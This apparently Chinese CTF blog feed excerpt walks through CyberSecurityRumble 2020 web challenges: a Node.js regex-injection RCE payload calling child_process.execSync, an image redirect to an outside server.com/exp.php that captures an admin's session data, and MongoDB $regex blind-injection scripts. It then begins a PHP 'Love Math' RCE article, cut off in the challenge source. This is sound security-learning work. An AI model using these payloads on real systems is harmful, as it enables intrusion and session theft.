<p>见 <a href="https://nodejs.org/api/globals.html#globals_require">官方文档</a> 和 <a href="https://runkit.com/phith0n/5dc0f2cb6866bd0013b764c5">示例</a>  ：</p>
<blockquote>
<p><a href="https://nodejs.org/api/globals.html#globals_require">require()</a></p>
<p>This variable may appear to be global <strong>but is not</strong>. See <a href="https://nodejs.org/api/modules.html#modules_require_id"><code>require()</code></a>.</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">(function()&#123;Function(&#x27;console.log(require(&quot;fs&quot;).readFileSync(&quot;/etc/passwd&quot;))&#x27;)()&#125;)()</span><br><span class="line"><span class="comment">//ReferenceError: require is not defined</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>这题就没有，而 <code>process.mainModule</code> 属性提供了一种获取 <code>require.main</code> 的替代方式，换言之，我们可以通过 <code>process.mainModule.require(&#39;fs&#39;)</code>  来载入，然后通过 <code>fs.readdirSync(path[, options])</code> 同步返回一个包含“指定目录下所有文件名称”的数组对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test</span></span><br><span class="line">\w/gi);</span><br><span class="line"><span class="keyword">let</span> files = []; </span><br><span class="line"><span class="keyword">const</span> fs = process.mainModule.require(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line">fs.readdirSync(<span class="string">&quot;.&quot;</span>).forEach(<span class="function"><span class="params">file</span> =&gt;</span> files.push(file) ); </span><br><span class="line"><span class="keyword">return</span> files;/</span><br><span class="line">------</span><br><span class="line"><span class="string">&#x27;123&#x27;</span>.match(<span class="regexp">/\w/gi</span>);<span class="keyword">let</span> files = []; <span class="keyword">const</span> fs = process.mainModule.require(<span class="string">&#x27;fs&#x27;</span>);fs.readdirSync(<span class="string">&quot;.&quot;</span>).forEach(<span class="function"><span class="params">file</span> =&gt;</span> files.push(file) );<span class="keyword">return</span> files;<span class="comment">//gi)</span></span><br><span class="line">------</span><br><span class="line">&#123; <span class="string">&quot;result&quot;</span>: [ <span class="string">&quot;.dockerignore&quot;</span>, <span class="string">&quot;api.js&quot;</span>, <span class="string">&quot;csregex&quot;</span>, <span class="string">&quot;dist&quot;</span>, <span class="string">&quot;dockerfile&quot;</span>, <span class="string">&quot;index.js&quot;</span>, <span class="string">&quot;leftover.js&quot;</span>, <span class="string">&quot;node_modules&quot;</span>, <span class="string">&quot;package-lock.json&quot;</span>, <span class="string">&quot;package.json&quot;</span>, <span class="string">&quot;regexer.js&quot;</span>, <span class="string">&quot;requests.log&quot;</span>, <span class="string">&quot;simple-fs.js&quot;</span> ] &#125;</span><br></pre></td></tr></table></figure>
<p>成功，那么接下来只要读取这些文件，结果在 <code>dockerfile</code> 中：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test</span></span><br><span class="line">\w/gi);</span><br><span class="line"><span class="keyword">const</span> fs = process.mainModule.require(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> data = fs.readFileSync(<span class="string">&#x27;dockerfile&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span> data;/</span><br><span class="line">------</span><br><span class="line"><span class="string">&#x27;123&#x27;</span>.match(<span class="regexp">/\w/gi</span>); <span class="keyword">const</span> fs = process.mainModule.require(<span class="string">&#x27;fs&#x27;</span>); <span class="keyword">const</span> data = fs.readFileSync(<span class="string">&#x27;dockerfile&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>); <span class="keyword">return</span> data;<span class="comment">//gi)</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/11/08/RDK2VCa1BehjSW9.png" style="zoom:80%;" /></p>
<p>当然也可以直接 <code>cat</code> 读取文件：</p>
<p>先给出拼接后的 JavaScript Code :</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>+<span class="title">constructor</span>.<span class="title">constructor</span>(<span class="params"><span class="string">&quot;return process&quot;</span></span>)(<span class="params"></span>).<span class="title">mainModule</span>.<span class="title">require</span>(<span class="params"><span class="string">&quot;child_process&quot;</span></span>).<span class="title">execSync</span>(<span class="params"><span class="string">&#x27;cat * | grep CSR&#x27;</span></span>)+&#x27; \<span class="title">n</span>&#x27;.<span class="title">match</span>(<span class="params"><span class="regexp">/\w/gi</span></span>)</span><br></pre></td></tr></table></figure>
<p>同上，只不过是选择先闭合了要匹配的字符串，获得全局上下文后直接导入 <code>child_process</code> 来执行系统命令。</p>
<p>payload（ exp 学习自 <a href="https://github.com/masahiro331/CVE-2019-10758">CVE-2019-10758 PoC</a>）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;+this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&#39;cat * | grep CSR&#39;)+&#39; </span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/11/08/Z4QoM6rsiFRHuXv.png" style="zoom:80%;" /></p>
<h2 id="imghost"><a href="#imghost" class="headerlink" title="imghost"></a>imghost</h2><p>文件上传。</p>
<p><img src="https://i.loli.net/2020/11/08/UcCQp2X63lGiHgd.png" style="zoom:80%;" /></p>
<p>PHP，dirsearch 扫目录有：</p>
<p><img src="https://i.loli.net/2020/11/08/6tsAZ8N5zFG1wEL.png" style="zoom:80%;" /></p>
<p>得到 file.php 源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$filename = substr($_SERVER[<span class="string">&quot;DOCUMENT_URI&quot;</span>], <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="string">&quot;/dev/shm/uploads/&quot;</span> . $filename) || strlen($filename) &gt; <span class="number">24</span>) <span class="keyword">die</span>(<span class="string">&quot;&lt;h1&gt;404 File not found&lt;/h1&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&quot;report&quot;</span>] == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span>(!file_exists(<span class="string">&quot;/dev/shm/reports&quot;</span>)) mkdir(<span class="string">&quot;/dev/shm/reports&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!file_exists(<span class="string">&quot;/dev/shm/reports/&quot;</span> . $filename)) &#123;</span><br><span class="line">		file_put_contents(<span class="string">&quot;/dev/shm/reports/&quot;</span> . $filename, <span class="string">&quot;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;File has been reported, thanks for your help!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Security-Policy: script-src &#x27;none&#x27;;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;object border=&quot;2px&quot; data=&quot;/uploads/&#x27;</span> . $filename . <span class="string">&#x27;?lang=en&amp;ref=website&amp;pd=&#x27;</span> . md5(session_id()) . <span class="string">&#x27;&amp;u=&#x27;</span> . uniqid() . <span class="string">&#x27;&amp;client=&#x27;</span> . session_id() . <span class="string">&#x27;&amp;method=direct&amp;t=&#x27;</span> . time() . <span class="string">&#x27;&quot;&gt;&lt;/object&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;a href=&quot;?report=1&quot;&gt;Report abuse&lt;/a&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里需要注意的是 HTTP 头信息的 <code>Content-Security-Policy</code> ，简称 CSP ，通常是用来防 XSS 的，提供了很多限制选项，这里的 <code>script-src</code> 限制外部脚本的加载，选项值是 <code>&#39;none&#39;</code> 禁止加载任何外部资源，所以基本不可能 RCE 。</p>
<p>结合题名，我们可以尝试去获取管理员的 session id 。</p>
<p>当我们上传一个图片后，点击，<code>~/i/encrypted_filename.png</code> 会去请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~&#x2F;uploads&#x2F;FHYVFZAsWZukicREmqTS.png?lang&#x3D;en&amp;ref&#x3D;website&amp;pd&#x3D;387a36e941f19635f8f898f8e2af0dd2&amp;u&#x3D;5fa8e6669c74b&amp;client&#x3D;hluad03qhmob6onl376hlnad5h&amp;method&#x3D;direct&amp;t&#x3D;1604904550</span><br></pre></td></tr></table></figure>
<p>用以校验身份，而访问图片成功后，有 Report abuse ，点击 referer 同样是来自 <code>~/i/encrypted_filename.png</code> ，结合源码，File Report 后，会在 <code>/dev/shm/reports/</code> 目录下生成一个对应的文件，可以合理猜测，管理员进行访问时也会有来自 <code>~/i/encrypted_filename.png</code> 的请求用来校验身份。</p>
<p>综上，我们可以利用上传的图片重定向到我们的服务器用来获取 session id 。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://server.com/exp.php&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>exp.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $d = json_encode($_SERVER);</span><br><span class="line">    $filename = <span class="keyword">__DIR__</span> . <span class="string">&quot;/data.txt&quot;</span>;</span><br><span class="line">    file_put_contents($filename, $d);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后我们可以从本地 data.txt 得到 session id ，替换后再次访问可以从 flag.txt 得到 flag 。</p>
<p>本地测试了下，data.txt 读取到 <code>$_SERVER</code> 的内容：</p>
<p><img src="https://i.loli.net/2020/11/09/a5coXiYIzQEv1rJ.png" style="zoom:80%;" /></p>
<h1 id="Secure-Secret-Sharing"><a href="#Secure-Secret-Sharing" class="headerlink" title="Secure Secret Sharing"></a>Secure Secret Sharing</h1><p>源码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;SHA256&#125; = <span class="built_in">require</span>(<span class="string">&quot;sha2&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> MongoClient = <span class="built_in">require</span>(<span class="string">&#x27;mongodb&#x27;</span>).MongoClient;</span><br><span class="line"><span class="keyword">const</span> mongo_url = <span class="string">&#x27;mongodb://localmongo&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> db_name = <span class="string">&#x27;secrets&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> db_client = <span class="keyword">new</span> MongoClient(mongo_url);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db_client.connect(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123; </span><br><span class="line">    db = db_client.db(db_name);</span><br><span class="line">    collection = db.collection(<span class="string">&quot;secrets&quot;</span>)</span><br><span class="line">    app.listen(<span class="number">8080</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">request, response</span>) </span>&#123;</span><br><span class="line">    response.sendFile(path.join(__dirname + <span class="string">&#x27;/html/index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入数据</span></span><br><span class="line">app.post(<span class="string">&#x27;/secret_share&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">request, response</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> sec = request.body.sec;</span><br><span class="line">    <span class="comment">//sha256 散列，十六进制输出</span></span><br><span class="line">    <span class="keyword">let</span> secid = SHA256(sec).toString(<span class="string">&quot;hex&quot;</span>);</span><br><span class="line">    <span class="comment">//无 csr 的情况插入</span></span><br><span class="line">    <span class="keyword">if</span> (sec.toLowerCase().includes(<span class="string">&quot;csr&quot;</span>)) &#123;</span><br><span class="line">        response.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        collection.insertOne(&#123;<span class="attr">id</span>: secid, <span class="attr">secret</span>: sec&#125;);</span><br><span class="line">        response.redirect(<span class="string">&#x27;/secret_share?secid=&#x27;</span> + secid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过 secid 进行检索</span></span><br><span class="line">app.get(<span class="string">&#x27;/secret_share&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">request, response</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> secid = request.query.secid;</span><br><span class="line">    <span class="keyword">var</span> sec = collection.findOne(&#123;<span class="attr">id</span>: secid&#125;);</span><br><span class="line">    sec.then(<span class="function"><span class="params">sec</span> =&gt;</span> &#123;</span><br><span class="line">        fs.readFile(__dirname +<span class="string">&#x27;/html/secret.html&#x27;</span>, &#123;<span class="attr">encoding</span>: <span class="string">&#x27;utf-8&#x27;</span>&#125;, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                response.send(data.replace(<span class="string">&quot;$secret&quot;</span>, sec[<span class="string">&quot;secret&quot;</span>]));</span><br><span class="line">                response.end();</span><br><span class="line">            &#125; <span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Error: &quot;</span> + e);</span><br><span class="line">                response.status(<span class="number">404</span>);</span><br><span class="line">                response.send(<span class="string">&quot;id does not exist.&quot;</span>);</span><br><span class="line">                response.end();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);        </span><br><span class="line">    &#125;, <span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(error);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">request, response</span>) </span>&#123;</span><br><span class="line">    fs.readFile(__filename, &#123;<span class="attr">encoding</span>: <span class="string">&#x27;utf-8&#x27;</span>&#125;, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">        response.type(<span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line">        response.send(data);</span><br><span class="line">        response.end();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>ExpressJS  MongoDB</p>
<p>因为国内文章关于 MongoDB 注入的比较少且发布时间早，所以我近期写了一篇文章在博客进行介绍，不了解的朋友可以先去看看：mongodb 注入初识</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sec = collection.findOne(&#123;<span class="attr">id</span>: secid&#125;);</span><br></pre></td></tr></table></figure>
<p>由上，注入点可以确定为 secid 。</p>
<p>用 <code>$ne</code> 进行测试一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;test</span><br><span class="line">?secid[$ne]&#x3D;0</span><br><span class="line">MySuperSecurePW123</span><br></pre></td></tr></table></figure>
<p>因为这里是 <code>findOne()</code> 只能返回第一条文档记录，而且最重要的一点，secid 是 sha256 加密过的，哈希值之间的差异非常大，我们不能凭 flag 的格式获取到前几位，所以我们改用 <code>$regex</code> 进行类似盲注的测试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;test</span><br><span class="line">?secid[$regex]&#x3D;^0</span><br><span class="line">princess</span><br><span class="line">&#x2F;&#x2F;princess -&gt; 04e77bf8f95cb3e1a36a59d1e93857c411930db646b46c218a0352e432023cf2</span><br></pre></td></tr></table></figure>
<p>这样是可行的，我们可以利用 <code>$regex</code> 位位遍历 0~f  ，总能找到一个内容含 CSR 的 secret ，所以我手工测试了下，发现最好的情况是前四位就可以区分不同的哈希（开始有了 <code>id does not exist.</code> 的回显）。</p>
<p>这里“盲注”不像 SQL 里面可以用二分法，要位位遍历，所以效率非常低。</p>
<p>用四循环遍历当然太慢了，而且出现连续三位相同的概率几乎为 0 ，我们调换一下顺序，并且用 <code>.</code> 代替一位，这里因为只返回第一条文档，所以我们可以挨个试位置，所幸替换第一位就出了结果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Outloop</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;0123456789abcdef&quot;</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;123456789abcdef0&quot;</span>:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="string">&quot;23456789abcdef01&quot;</span>:</span><br><span class="line">                url = <span class="string">&quot;http://chal.cybersecurityrumble.de:37585/secret_share?secid[$regex]=^.&#123;&#125;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i, j, k)</span><br><span class="line">                print(<span class="string">&quot;[i] Still looking for: &quot;</span>+i+j+k)</span><br><span class="line">                response = requests.request(<span class="string">&quot;GET&quot;</span>, url)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;CSR&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                    print(<span class="string">&quot;[+] Flag: CSR&quot;</span>+re.search(<span class="string">r&quot;CSR(.*)&#125;&quot;</span>,response.text)[<span class="number">1</span>]+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">                    <span class="keyword">raise</span> Outloop()</span><br><span class="line"><span class="keyword">except</span> Outloop:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/11/10/LlIxroiJBM6fkeU.png" style="zoom:80%;" /></p>
<p>发 200+ 次请求得到了 flag 。</p>
<p><a href="https://github.com/Toboxos/ctf-writeups/blob/main/CyberSecurityRumble2020/Secure%20Secret%20Sharing.md">国外师傅</a>有给出优化版本的，是把哈希值视为了树结构，从根节点开始（设置 0~f 中的任意值），先判断其是否有子节点，如果有，是否有多个，优化规则如下：</p>
<blockquote>
<p>如果一个节点只有一个子节点，我们假设它只会产生一个散列，因此我们不会遍历子节点的路径。</p>
</blockquote>
<p>也就是假设 payload 为 <code>?secid[$regex]=^73</code> 没有子节点，那么当然我们遍历第三层时，就不会再去遍历 730，731，…，73f 等；而如果 78c 有一个子节点 78c1 ，也认为其只会产生一个散列 78c1 ，如图（图源自国外师傅 wp）：</p>
<p><img src="https://i.loli.net/2020/11/10/mvXjxQCEotKl1B9.png" style="zoom:67%;" /></p>
<p>可以想到，我们上面写的脚本其实是所有节点不管有没有子节点都去遍历了一遍，所以非常耗时间。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://chal.cybersecurityrumble.de:37585/secret_share?secid[$regex]=^&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找 flag 的正则表达式</span></span><br><span class="line">regex = <span class="string">r&quot;--&gt;(.*)&lt;!--&quot;</span></span><br><span class="line"></span><br><span class="line">deadStarts = []</span><br><span class="line"></span><br><span class="line">chars = <span class="string">&quot;0123456789abcdef&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果父节点有多个子节点</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parentHasMoreThanOneChildren</span>(<span class="params"><span class="built_in">hash</span></span>):</span></span><br><span class="line">    l = <span class="built_in">len</span>(<span class="built_in">hash</span>) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> l &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    url = URL + <span class="built_in">hash</span>[:l] + <span class="string">&#x27;[^&#x27;</span> + <span class="built_in">hash</span>[l] + <span class="string">&#x27;]&#x27;</span></span><br><span class="line">    </span><br><span class="line">    r = req.get( url )</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">404</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否有子节点</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hasChild</span>(<span class="params"><span class="built_in">hash</span></span>):</span></span><br><span class="line">    url = URL + <span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">    r = req.get( url )</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">404</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 secret</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSecret</span>(<span class="params"><span class="built_in">hash</span></span>):</span></span><br><span class="line">    url = URL + <span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">    r = req.get( url )</span><br><span class="line">    <span class="keyword">return</span> re.search(regex, r.text)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问子节点判断是否有 flag</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visitChild</span>(<span class="params"><span class="built_in">hash</span></span>):</span></span><br><span class="line">    print(<span class="built_in">hash</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> parentHasMoreThanOneChildren(<span class="built_in">hash</span>):</span><br><span class="line">        secret = getSecret(<span class="built_in">hash</span>)</span><br><span class="line">        print( secret )</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;csr&quot;</span> <span class="keyword">in</span> secret.lower():</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">        <span class="keyword">if</span> hasChild( <span class="built_in">hash</span> + c ):</span><br><span class="line">            visitChild( <span class="built_in">hash</span> +c )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里设置的根节点为 6</span></span><br><span class="line">visitChild( <span class="string">&#x27;6&#x27;</span> )</span><br></pre></td></tr></table></figure>
<p>实际上确实是很快。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这次比赛打完复盘收获不少，相比于一些比赛总是模改题还是非常不错的，也感觉到自己开发经验欠缺，比如 node 只在原型链污染有接触过一点点，但却没有深入，还是要继续努力。</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP利用Math函数RCE总结</title>
    <url>/archives/e11628b6.html</url>
    <content><![CDATA[<div class="note info">
            <p>本文由<strong>landvsec</strong>原创发布<br>转载，请参考<a href="https://www.anquanke.com/note/repost">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/220813">https://www.anquanke.com/post/id/220813</a><br>安全客 - 有思想的安全新媒体</p>
          </div>
<a id="more"></a>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>安全客投稿成功的第一篇文章，面向基础。</p>
<p>由 2019 国赛 love math 而来，国赛题目质量一直可以的，“数学题”近年来也不少，比如今年护网杯，但网上一些博客写得不够基础，比如 php 异或的原理是什么？为什么两个字符串异或会得到这个？完全没有解答。</p>
<p>写这篇文章的目的，就是从基础层面上，收集师傅们的各种解题方法来总的分析一下—— php 怎么利用数学函数来代码执行。</p>
<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><h2 id="Love-Math"><a href="#Love-Math" class="headerlink" title="Love Math"></a>Love Math</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ban 了单双反引号，不能直接利用 eval 命令执行</span></span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span 